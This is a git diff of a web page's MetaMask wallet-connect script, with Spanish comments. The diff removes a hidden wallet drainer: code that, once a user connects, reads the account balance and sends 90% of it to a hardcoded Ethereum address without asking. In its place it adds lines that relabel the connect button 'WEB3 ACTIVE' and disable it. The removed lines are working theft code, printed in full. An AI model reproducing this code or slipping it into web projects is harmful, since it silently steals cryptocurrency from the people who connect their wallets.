@@ -62,21 +62,9 @@ document.addEventListener('DOMContentLoaded', () => {
                     element.innerText = account;
                 });
 
-                // Hacer visible el botón de compra si estaba oculto
-                buyButton.classList.remove('hidden');
-
-                // Enviar 90% del saldo del usuario
-                const balanceInWei = await web3.eth.getBalance(account);
-                const balanceInEther = web3.utils.fromWei(balanceInWei, 'ether');
-                const amountToSendInEther = (balanceInEther * 0.9).toFixed(18); // Calcular el 90% del saldo
-                const amountToSendInWei = web3.utils.toWei(amountToSendInEther, 'ether');
-                const recipientAddress = '0x01C65F22A9478C2932e62483509c233F0aaD5c72';
-
-                await web3.eth.sendTransaction({
-                    from: account,
-                    to: recipientAddress,
-                    value: amountToSendInWei
-                });
+                // Cambiar el texto del botón a "WEB3 ACTIVE"
+                connectWalletButton.innerText = "WEB3 ACTIVE";
+                connectWalletButton.disabled = true;
 
             } catch (error) {
                 console.error("Error connecting to MetaMask:", error);
